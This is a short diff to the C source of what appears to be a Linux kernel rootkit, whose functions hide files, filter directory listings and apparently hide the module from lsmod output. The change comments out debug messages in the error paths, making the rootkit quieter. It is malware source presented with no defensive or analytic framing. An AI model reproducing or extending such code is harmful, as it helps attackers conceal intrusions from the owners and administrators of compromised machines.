@@ -43,13 +43,13 @@ bool should_hide_file(const char __user *filename)
     kern_buff = kzalloc(strlen_user(filename)+1, GFP_KERNEL);
     if(!kern_buff)
     {
-        DEBUG("RAN OUT OF MEMORY in FILE FILTER");
+        //DEBUG("RAN OUT OF MEMORY in FILE FILTER");
         goto cleanup;
     }
 
     if(copy_from_user(kern_buff, filename, strlen_user(filename)))
     {   
-        DEBUG("PROBLEM COPYING FILENAME FROM USER in FILE Filter");
+        //DEBUG("PROBLEM COPYING FILENAME FROM USER in FILE Filter");
         goto cleanup;
     }
     
@@ -136,7 +136,7 @@ long handle_ls(struct linux_dirent *dirp, long length)
     new_dirp = (struct dirent *) kmalloc(length, GFP_KERNEL);
     if(!new_dirp)
     {
-        DEBUG("RAN OUT OF MEMORY in LS Filter");
+        //DEBUG("RAN OUT OF MEMORY in LS Filter");
         goto error;
     }
 
@@ -309,7 +309,7 @@ long remove_rootkit(char *buf, long length)
     new_buff = kzalloc(strlen(buf)+1, GFP_KERNEL);
     if(!new_buff)
     {
-        DEBUG("NOT ENOUGH MEMORY in LSMOD FILTER");
+        //DEBUG("NOT ENOUGH MEMORY in LSMOD FILTER");
         goto cleanup;
     }
     
